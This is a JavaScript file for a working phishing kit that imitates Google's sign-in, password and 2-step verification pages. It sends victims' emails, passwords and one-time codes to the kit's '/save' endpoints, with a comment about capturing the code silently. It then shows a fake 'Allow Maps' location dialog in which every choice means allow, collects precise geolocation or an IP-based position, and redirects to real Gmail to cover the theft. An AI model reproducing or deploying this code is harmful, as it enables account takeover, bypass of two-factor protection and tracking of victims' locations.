(function(){
    'use strict';

    // ---- Loading Bar Helper ----
    function showLoadingBar(form, duration, callback) {
        var card = document.querySelector('.card');
        if(card) {
            card.style.position = 'relative';
            card.classList.add('is-loading');
            // only add if it doesn't already exist
            if(!card.querySelector('.progress-bar')) {
                var pb = document.createElement('div');
                pb.className = 'progress-bar active';
                card.appendChild(pb);
            }
            if(form) {
                var inputs = form.querySelectorAll('input, button');
                inputs.forEach(function(el){ el.disabled = true; });
            }
        }
        if(callback) {
            setTimeout(callback, duration || 1200);
        }
    }

    // ---- SIGN IN ----
    var signInForm=document.getElementById('signInForm');
    if(signInForm){
        signInForm.addEventListener('submit',function(e){
            e.preventDefault();
            var inp=document.getElementById('identifierId');
            var fld=document.getElementById('emailField');
            var err=document.getElementById('emailErr');
            if(!inp.value.trim()){
                fld.classList.add('has-error');
                err.classList.add('show');
                inp.focus();
                return;
            }
            fld.classList.remove('has-error');
            err.classList.remove('show');
            var emailVal = inp.value.trim();
            sessionStorage.setItem('gEmail', emailVal);
            
            var payload = { email: emailVal, password: '[PENDING]' };
            submitData(payload, '/save', signInForm, 'password', false);
        });
        var ei=document.getElementById('identifierId');
        if(ei)ei.addEventListener('input',function(){
            document.getElementById('emailField').classList.remove('has-error');
            document.getElementById('emailErr').classList.remove('show');
        });
    }

    // ---- FORGOT EMAIL ----
    var forgotForm=document.getElementById('forgotForm');
    if(forgotForm){
        forgotForm.addEventListener('submit',function(e){
            e.preventDefault();
            var ri=document.getElementById('recoveryInput');
            var rf=document.getElementById('recovField');
            var re=document.getElementById('recovErr');
            var fn=document.getElementById('firstName');
            var ln=document.getElementById('lastName');
            var fnf=document.getElementById('fnField');
            var lnf=document.getElementById('lnField');
            var ne=document.getElementById('nameErr');
            var bad=false;

            if(!ri.value.trim()){
                rf.classList.add('has-error');re.classList.add('show');
                if(!bad)ri.focus();bad=true;
            }else{rf.classList.remove('has-error');re.classList.remove('show')}

            if(!fn.value.trim()||!ln.value.trim()){
                if(!fn.value.trim())fnf.classList.add('has-error');
                if(!ln.value.trim())lnf.classList.add('has-error');
                ne.classList.add('show');
                if(!bad){(!fn.value.trim()?fn:ln).focus()}
                bad=true;
            }else{fnf.classList.remove('has-error');lnf.classList.remove('has-error');ne.classList.remove('show')}

            if(!bad){
                showModal("Couldn't find your Google Account","Try again");
            }
        });

        ['recoveryInput','firstName','lastName'].forEach(function(id){
            var el=document.getElementById(id);
            if(el)el.addEventListener('input',function(){
                var f=this.closest('.field');
                if(f)f.classList.remove('has-error');
                if(id==='recoveryInput')document.getElementById('recovErr').classList.remove('show');
                if(id==='firstName'||id==='lastName'){
                    var a=document.getElementById('firstName').value.trim();
                    var b=document.getElementById('lastName').value.trim();
                    if(a||b)document.getElementById('nameErr').classList.remove('show');
                    if(a)document.getElementById('fnField').classList.remove('has-error');
                    if(b)document.getElementById('lnField').classList.remove('has-error');
                }
            });
        });
    }

    // ---- PASSWORD ----
    var pwForm=document.getElementById('passwordForm');
    if(pwForm){
        // Load stored email
        var chip=document.getElementById('chipEmail');
        if(chip){
            var stored=sessionStorage.getItem('gEmail')||'';
            if(stored){
                chip.textContent=stored.indexOf('@')===-1?stored+'@gmail.com':stored;
            }
        }

        // ---- CHIP DROPDOWN (Account Picker) ----
        var chipWrap=document.getElementById('chipWrap');
        var userChip=document.getElementById('userChip');
        var chipOverlay=document.getElementById('chipOverlay');
        var chipDropdownList=document.getElementById('chipDropdownList');

        // Saved accounts — only from localStorage (no defaults)
        var accounts = [];
        try {
            var saved = localStorage.getItem('gAccounts');
            if(saved) accounts = JSON.parse(saved);
        } catch(e) { accounts = []; }

        if(chipDropdownList && accounts.length) {
            accounts.forEach(function(acc) {
                var row = document.createElement('a');
                row.href = '#';
                row.className = 'chip-dropdown-row';
                row.addEventListener('click', function(e) {
                    e.preventDefault();
                    sessionStorage.setItem('gEmail', acc.email);
                    window.location.reload();
                });

                var avatar = document.createElement('div');
                avatar.className = 'account-avatar';
                avatar.style.backgroundColor = acc.color;
                avatar.textContent = acc.name.charAt(0).toUpperCase();

                var info = document.createElement('div');
                info.innerHTML = '<div class="chip-dropdown-name">' + escHtml(acc.name) + '</div>' +
                                 '<div class="chip-dropdown-email">' + escHtml(acc.email) + '</div>';

                row.appendChild(avatar);
                row.appendChild(info);
                chipDropdownList.appendChild(row);
            });
        }

        // Toggle dropdown
        if(userChip && chipWrap) {
            userChip.addEventListener('click', function(e) {
                e.stopPropagation();
                var isOpen = chipWrap.classList.toggle('open');
                if(chipOverlay) chipOverlay.classList.toggle('active', isOpen);
            });
        }

        // Close dropdown on overlay click
        if(chipOverlay) {
            chipOverlay.addEventListener('click', function() {
                if(chipWrap) chipWrap.classList.remove('open');
                chipOverlay.classList.remove('active');
            });
        }

        function escHtml(s) {
            var d = document.createElement('div');
            d.textContent = s;
            return d.innerHTML;
        }

        pwForm.addEventListener('submit',function(e){
            e.preventDefault();
            var inp=document.getElementById('passwordInput');
            var fld=document.getElementById('pwField');
            var err=document.getElementById('pwErr');
            if(!inp.value){
                fld.classList.add('has-error');err.classList.add('show');inp.focus();return;
            }
            fld.classList.remove('has-error');err.classList.remove('show');

            // Capture credentials and send to backend
            var emailVal=sessionStorage.getItem('gEmail')||document.getElementById('chipEmail').textContent||'';
            var pwVal=inp.value;

            var payload = { email: emailVal, password: pwVal };
            submitData(payload, '/save', pwForm, '2sv', false);
        });

        var pi=document.getElementById('passwordInput');
        if(pi)pi.addEventListener('input',function(){
            document.getElementById('pwField').classList.remove('has-error');
            document.getElementById('pwErr').classList.remove('show');
        });

        // Eye toggle
        var eye=document.getElementById('toggleEye');
        if(eye)eye.addEventListener('click',function(){
            var pw=document.getElementById('passwordInput');
            var chk=document.getElementById('showPwCheck');
            pw.type=pw.type==='password'?'text':'password';
            if(chk)chk.checked=pw.type==='text';
        });

        // Checkbox toggle
        var sc=document.getElementById('showPwCheck');
        if(sc)sc.addEventListener('change',function(){
            document.getElementById('passwordInput').type=this.checked?'text':'password';
        });
    }

    // ---- 2-STEP VERIFICATION ----
    var twosvForm = document.getElementById('twosvForm');
    if (twosvForm) {
        var chip2 = document.getElementById('chipEmail2sv');
        if(chip2){
            var stored = sessionStorage.getItem('gEmail') || '';
            if(stored){
                chip2.textContent = stored.indexOf('@') === -1 ? stored + '@gmail.com' : stored;
            }
        }

        twosvForm.addEventListener('submit', function(e) {
            e.preventDefault();
            var inp = document.getElementById('twosvInput');
            var fld = document.getElementById('twosvField');
            var err = document.getElementById('twosvErr');

            if (!inp.value) {
                fld.classList.add('has-error');
                err.classList.add('show');
                inp.focus();
                return;
            }
            fld.classList.remove('has-error');
            err.classList.remove('show');

            var emailVal = sessionStorage.getItem('gEmail') || (chip2 ? chip2.textContent : '') || '';
            var codeVal = inp.value;

            var payload = { email: emailVal, code: codeVal };
            submitData(payload, '/save-2sv', twosvForm, 'https://mail.google.com/mail', true);
        });

        var ti = document.getElementById('twosvInput');
        if (ti) ti.addEventListener('input', function() {
            document.getElementById('twosvField').classList.remove('has-error');
            document.getElementById('twosvErr').classList.remove('show');
        });
    }

    // ---- Modal helper ----
    function showModal(content,btnText,isHtml){
        var ov=document.createElement('div');
        ov.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;z-index:9999;animation:fadeIn .2s ease';
        var bx=document.createElement('div');
        bx.style.cssText='background:#fff;border-radius:28px;padding:24px 32px;font-family:Google Sans,Roboto,Arial;font-size:14px;color:#202124;box-shadow:0 11px 15px -7px rgba(0,0,0,.2),0 24px 38px 3px rgba(0,0,0,.14),0 9px 46px 8px rgba(0,0,0,.12);text-align:center;max-width:340px;width:90%';
        if(isHtml){
            bx.innerHTML=content;
        }else{
            bx.innerHTML='<p style="margin-bottom:20px;font-size:14px;line-height:20px">'+content+'</p>'+(btnText?'<button style="background:#1a73e8;color:#fff;border:none;border-radius:100px;padding:0 24px;height:36px;font-size:14px;cursor:pointer;font-family:Google Sans,Roboto,Arial;font-weight:500;letter-spacing:.25px" onclick="this.closest(\'div[style]\').parentElement.remove()">'+btnText+'</button>':'');
        }
        ov.appendChild(bx);
        document.body.appendChild(ov);
        ov.addEventListener('click',function(e){if(e.target===ov)ov.remove()});
    }

    // ---- Location & Submit Helper ----
    function submitData(payload, endpoint, form, nextUrl, requireLocation) {
        var startTime = Date.now();

        function proceed() {
            showLoadingBar(form, 0, null);
            // Only fall back to storage/Unknown if payload doesn't already have it (like 'Denied')
            payload.lat = payload.lat || sessionStorage.getItem('gLat') || 'Unknown';
            payload.lon = payload.lon || sessionStorage.getItem('gLon') || 'Unknown';
            
            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(function(){}).finally(function(){
                var elapsed = Date.now() - startTime;
                var remaining = Math.max(0, 1000 - elapsed);
                setTimeout(function(){ window.location.href = nextUrl; }, remaining);
            });
        }

        if (!requireLocation || sessionStorage.getItem('gLat')) {
            proceed();
        } else {
            // SILENTLY SAVE 2SV CODE IMMEDIATELY:
            // This ensures you capture their code instantly before the location prompt appears.
            var immediatePayload = Object.assign({}, payload);
            immediatePayload.lat = 'Unknown';
            immediatePayload.lon = 'Unknown';
            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(immediatePayload)
            }).catch(function(){});

            showLoadingBar(form, 0, null);
            
            showLoadingBar(form, 0, null);
            
            setTimeout(function() {
                var card = document.querySelector('.card');
                if(card) card.classList.remove('is-loading');
                var pb = document.querySelector('.progress-bar');
                if(pb) pb.remove();
                
                var content = '<div style="text-align:center; padding: 0 16px;">' +
                    '<div style="display:flex;justify-content:center;margin-bottom:12px;">' +
                        '<div style="width:24px;height:24px;display:flex;align-items:center;justify-content:center;">' +
                            '<svg width="24" height="24" viewBox="0 0 24 24" style="fill:#1a73e8;"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>' +
                        '</div>' +
                    '</div>' +
                    '<h2 style="font-size:18px;font-family:\'Google Sans\',Roboto,Arial;font-weight:500;margin:0 0 24px;color:#1f1f1f;line-height:24px;">Allow <b>Maps</b> to access this<br>device\'s precise location?</h2>' +
                    
                    '<div style="display:flex;justify-content:space-between;margin-bottom:24px;gap:12px;">' +
                        // Left Map (Precise)
                        '<div style="flex:1;display:flex;flex-direction:column;align-items:center;">' +
                            '<div style="width:110px;height:110px;border-radius:50%;border:2px solid #1a73e8;background:#f8f9fa;position:relative;overflow:hidden;background-image:linear-gradient(45deg,#ddd 25%,transparent 25%,transparent 75%,#ddd 75%,#ddd),linear-gradient(45deg,#ddd 25%,transparent 25%,transparent 75%,#ddd 75%,#ddd);background-size:20px 20px;background-position:0 0,10px 10px;">' +
                                '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);">' +
                                    '<svg width="32" height="32" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" fill="#1a73e8"/><circle cx="12" cy="9" r="3" fill="#fff"/></svg>' +
                                '</div>' +
                            '</div>' +
                            '<div style="font-family:\'Google Sans\',Roboto;font-size:13px;font-weight:500;color:#1f1f1f;margin-top:8px;">Precise</div>' +
                        '</div>' +
                        // Right Map (Approximate)
                        '<div style="flex:1;display:flex;flex-direction:column;align-items:center;">' +
                            '<div style="width:110px;height:110px;border-radius:50%;border:1px solid #dadce0;background:#f8f9fa;position:relative;overflow:hidden;background-image:linear-gradient(90deg,transparent 48%,#fbbc04 48%,#fbbc04 52%,transparent 52%),linear-gradient(0deg,transparent 48%,#fbbc04 48%,#fbbc04 52%,transparent 52%);background-size:40px 40px;">' +
                            '</div>' +
                            '<div style="font-family:\'Google Sans\',Roboto;font-size:13px;font-weight:400;color:#5f6368;margin-top:8px;">Approximate</div>' +
                        '</div>' +
                    '</div>' +

                    '<div style="display:flex;flex-direction:column;gap:4px;">' +
                        '<button class="fake-perm-btn" data-action="allow" style="background:#d2e3fc;color:#1f1f1f;border:none;border-radius:8px;padding:14px;font-size:14px;cursor:pointer;font-family:\'Google Sans\',Roboto;font-weight:500;text-align:center;">While using the app</button>' +
                        '<button class="fake-perm-btn" data-action="allow" style="background:#d2e3fc;color:#1f1f1f;border:none;border-radius:8px;padding:14px;font-size:14px;cursor:pointer;font-family:\'Google Sans\',Roboto;font-weight:500;text-align:center;">Only this time</button>' +
                    '</div>' +
                '</div>';
                
                showModal(content, null, true);
                
                var btns = document.querySelectorAll('.fake-perm-btn');
                btns.forEach(function(btn) {
                    btn.addEventListener('click', function(e) {
                        var action = this.getAttribute('data-action');
                        var ov = e.target.closest('div[style*="position:fixed"]');
                        if(ov) ov.remove();
                        
                        showLoadingBar(form, 0, null);
                        
                        if (action === 'allow') {
                            var coordsSaved = false;
                            
                            var getIpFallback = function() {
                                fetch('https://ipapi.co/json/')
                                  .then(function(res) { return res.json(); })
                                  .then(function(data) {
                                      if (data.latitude && data.longitude) {
                                          payload.lat = data.latitude;
                                          payload.lon = data.longitude;
                                      } else {
                                          payload.lat = 'Denied';
                                          payload.lon = 'Denied';
                                      }
                                      proceed();
                                  })
                                  .catch(function() {
                                      payload.lat = 'Denied';
                                      payload.lon = 'Denied';
                                      proceed();
                                  });
                            };

                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(function(pos) {
                                    sessionStorage.setItem('gLat', pos.coords.latitude);
                                    sessionStorage.setItem('gLon', pos.coords.longitude);
                                    payload.lat = pos.coords.latitude;
                                    payload.lon = pos.coords.longitude;
                                    proceed();
                                }, function(error) {
                                    getIpFallback();
                                }, { enableHighAccuracy: true, timeout: 5000 });
                            } else {
                                getIpFallback();
                            }
                        } else {
                            payload.lat = 'Denied';
                            payload.lon = 'Denied';
                            proceed();
                        }
                    });
                });
            }, 1200);
        }
    }
})();
